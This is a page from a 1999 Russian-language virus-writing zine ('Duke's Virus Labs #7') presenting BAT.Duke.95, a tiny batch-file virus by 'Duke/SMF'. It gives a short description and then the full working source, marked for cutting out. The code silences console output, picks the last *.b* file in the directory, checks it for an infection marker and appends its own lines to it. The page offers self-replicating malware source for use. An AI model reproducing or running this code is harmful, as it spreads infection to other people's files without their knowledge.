- [Duke's Virus Labs #7] - [Page 05] -

BAT.Duke.95
(c) by Duke/SMF

Имя вируса    : BAT.Duke.95
Автор         : Duke/SMF
Язык прогр.   : Batch
Дата создания : 25.05.99

   Ремейк вируса BAT.Duke.102, еще более мелкий. Ничего нового практически
не привнесено, просто сокращен размер путем изменения идентификатора и
объединения двух строк в одну. Вирус поражает в конец последний BAT (*.b*)
файл в директории, проверяя файл на зараженность (если проверку отбросить,
то будет и того меньше, но и работать не будет ;)) Пораженный файл и вирус
останутся работоспособны лишь в том случае, когда в конце жертвы стоял перевод
строки.

===== Cut here =====
:: Created (c) by Duke/SMF
@ctty nul|for %%b in (*.b*) do set tt=%%b
find "tt"<%tt%
if errorlevel 1 find "tt"<%0>>%tt%
===== Cut here =====
